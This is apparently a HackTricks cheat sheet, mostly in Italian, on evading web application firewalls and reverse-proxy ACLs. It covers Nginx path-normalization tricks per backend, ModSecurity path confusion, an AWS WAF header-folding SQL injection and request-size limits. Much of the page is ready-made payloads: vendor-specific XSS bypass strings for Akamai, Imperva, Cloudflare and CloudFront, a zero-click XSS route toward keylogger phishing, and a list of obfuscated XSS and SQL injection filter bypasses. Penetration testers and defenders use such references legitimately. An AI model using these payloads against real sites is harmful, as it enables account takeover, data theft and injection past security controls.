# Bypass delle protezioni Proxy / WAF

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tecniche [da questa ricerca](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx rule example:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Per prevenire bypass, Nginx esegue la normalizzazione del percorso prima di verificarlo. Tuttavia, se il server backend esegue una normalizzazione diversa (rimuovendo caratteri che Nginx non rimuove), potrebbe essere possibile aggirare questa difesa.

### **NodeJS - Express**

| Versione Nginx | **Caratteri di bypass per Node.js** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Versione Nginx | **Caratteri di bypass per Flask**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Versione Nginx | **Caratteri di bypass per Spring Boot** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Configurazione FPM di Nginx:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx è configurato per bloccare l'accesso a `/admin.php` ma è possibile bypassarlo accedendo a `/admin.php/index.php`.

### Come prevenire
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass delle Regole di Mod Security <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Confusione del percorso

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) viene spiegato che ModSecurity v3 (fino alla 3.0.12), **ha implementato in modo errato la variabile `REQUEST_FILENAME`** che avrebbe dovuto contenere il percorso accesso (fino all'inizio dei parametri). Questo perché effettuava una decodifica dell'URL per ottenere il percorso.\
Pertanto, una richiesta come `http://example.com/foo%3f';alert(1);foo=` in mod security supporrà che il percorso sia solo `/foo` perché `%3f` viene trasformato in `?` terminando il path dell'URL, ma in realtà il percorso che un server riceverà sarà `/foo%3f';alert(1);foo=`.

Anche le variabili `REQUEST_BASENAME` e `PATH_INFO` sono state interessate da questo bug.

Qualcosa di simile è accaduto nella versione 2 di Mod Security che permetteva di bypassare una protezione che impediva agli utenti di accedere a file con estensioni specifiche relative a backup (come `.bak`) semplicemente inviando il punto URL encoded in `%2e`, per esempio: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Header malformato

[Questa ricerca](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) menziona che era possibile bypassare le regole AWS WAF applicate agli header HTTP inviando un header malformato che non veniva correttamente parsato da AWS ma lo era dal server backend.

Per esempio, inviando la seguente richiesta con una SQL injection nell'header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Era possibile bypassare AWS WAF perché non capiva che la linea successiva faceva parte del valore dell'header mentre il server NODEJS lo faceva (questo è stato corretto).

## Generic WAF bypasses

### Request Size Limits

Solitamente i WAF hanno un limite di lunghezza delle richieste da controllare e se una richiesta POST/PUT/PATCH lo supera, il WAF non la ispezionerà.

- For AWS WAF, you can [**consultare la documentazione**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Dimensione massima del corpo della richiesta web che può essere ispezionato per le protezioni di Application Load Balancer e AWS AppSync</td><td>8 KB</td></tr><tr><td>Dimensione massima del corpo della richiesta web che può essere ispezionato per le protezioni di CloudFront, API Gateway, Amazon Cognito, App Runner, e Verified Access protections**</td><td>64 KB</td></tr></tbody></table>

- Da [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

I vecchi Web Application Firewall con Core Rule Set 3.1 (o inferiore) consentono messaggi più grandi di **128 KB** disattivando l'ispezione del corpo della richiesta, ma questi messaggi non verranno controllati per vulnerabilità. Per le versioni più recenti (Core Rule Set 3.2 o successive), la stessa cosa può essere ottenuta disabilitando il limite massimo del corpo della richiesta. Quando una richiesta supera il limite di dimensione:

Se **modalità di prevenzione**: registra e blocca la richiesta.\  
Se **modalità di rilevamento**: ispeziona fino al limite, ignora il resto e registra se il `Content-Length` supera il limite.

- Da [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Per default, il WAF ispeziona solo i primi 8KB di una richiesta. È possibile aumentare il limite fino a 128KB aggiungendo Advanced Metadata.

- Da [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Fino a 128KB.

### Static assets inspection gaps (.js GETs)

Alcune stack CDN/WAF applicano un'ispezione del contenuto debole o nulla alle richieste GET per asset statici (ad esempio percorsi che terminano con `.js`), pur applicando regole globali come rate limiting e IP reputation. Combinato con l'auto-caching delle estensioni statiche, questo può essere sfruttato per consegnare o inoculare varianti malevole che influenzano le risposte HTML successive.

Casi d'uso pratici:

- Inviare payload in header non affidabili (es. `User-Agent`) con un GET a un percorso `.js` per evitare l'ispezione del contenuto, poi richiedere immediatamente l'HTML principale per influenzare la variante cacheata.
- Usare un IP nuovo/pulito; una volta che un IP viene segnalato, i cambi di instradamento possono rendere la tecnica inaffidabile.
- In Burp Repeater, usare "Send group in parallel" (single-packet style) per gareggiare le due richieste (`.js` poi HTML) attraverso lo stesso percorso front-end.

Questo si abbina bene con header-reflection cache poisoning. Vedi:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [Come ho trovato un takeover di account 0-Click in un BBP pubblico e l'ho sfruttato per accedere a funzionalità di livello Admin](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### Offuscamento <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilità Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

A seconda dell'implementazione della normalizzazione Unicode (maggiori informazioni [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), i caratteri che condividono compatibilità Unicode possono essere in grado di bypassare il WAF ed essere eseguiti come il payload previsto. I caratteri compatibili possono essere trovati [here](https://www.compart.com/en/unicode).

#### Esempio <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bypass WAFs contestuali con encoding <a href="#ip-rotation" id="ip-rotation"></a>

Come menzionato in [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization), per bypassare WAFs in grado di mantenere un contesto dell'input utente potremmo abusare delle tecniche del WAF affinché normalizzi effettivamente l'input dell'utente.

Per esempio, nel post è indicato che **Akamai URL decoded a user input 10 times**. Quindi qualcosa come `<input/%2525252525252525253e/onfocus` sarà visto da Akamai come `<input/>/onfocus` il quale **potrebbe considerarlo innocuo poiché il tag è chiuso**. Tuttavia, fintanto che l'applicazione non fa URL decode dell'input 10 volte, la vittima vedrà qualcosa come `<input/%25252525252525253e/onfocus` che è **ancora valido per un attacco XSS**.

Questo permette quindi di **nascondere payloads in componenti codificati** che il WAF decodificherà e interpreterà mentre la vittima no.

Inoltre, questo può essere fatto non solo con payloads URL encoded ma anche con altre codifiche come unicode, hex, octal...

Nel post vengono suggeriti i seguenti bypass finali:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

È anche menzionato che a seconda di **come alcuni WAFs interpretano il contesto** dell'input utente, potrebbe essere possibile abusarne. L'esempio proposto nel blog è che Akamai consentiva di mettere qualsiasi cosa tra `/*` e `*/` (potenzialmente perché questo è comunemente usato come commento). Di conseguenza, una SQLinjection come `/*'or sleep(5)-- -*/` non verrebbe intercettata ed sarebbe valida poiché `/*` è la stringa iniziale dell'iniezione e `*/` è commentata.

Questo tipo di problemi di contesto può anche essere usato per **abuso di vulnerabilità diverse da quella prevista** per il WAF (es. potrebbe essere sfruttato anche per un XSS).

### Inline JavaScript first-statement inspection gaps

Alcuni ruleset di inline-inspection parsano solo il primo statement JavaScript presente all'interno di un event handler. Prefissando un'espressione dall'aspetto innocuo tra parentesi seguita da un punto e virgola (per esempio `onfocus="(history.length);payload"`), il codice malevolo posto dopo il punto e virgola bypassa l'ispezione mentre il browser lo esegue comunque. Combinando questo con il focus indotto da frammento (es., aggiungendo `#forgot_btn` così l'elemento target riceve il focus al caricamento) si ottiene un XSS senza click che può chiamare immediatamente `$.getScript` e avviare tool di phishing come keylogger. Vedi il [attribute-only login XSS case study](xss-cross-site-scripting/README.md#attribute-only-login-xss-behind-wafs) derivato da [this research](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/).

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generate an API gateway URL to by used with ffuf
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Similar to fireprox
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin that uses API gateway IPs
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): A dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

Possono essere usate diverse tecniche per bypassare i filtri regex sui firewall. Esempi includono alternating case, l'inserimento di line breaks e la codifica dei payloads. Risorse per i vari bypass si trovano su [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) e [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Gli esempi sotto sono tratti da [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Strumenti

- [**nowafpls**](https://github.com/assetnote/nowafpls): plugin di Burp per aggiungere dati inutili alle richieste e bypassare i WAFs in base alla lunghezza

## Riferimenti

- [https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
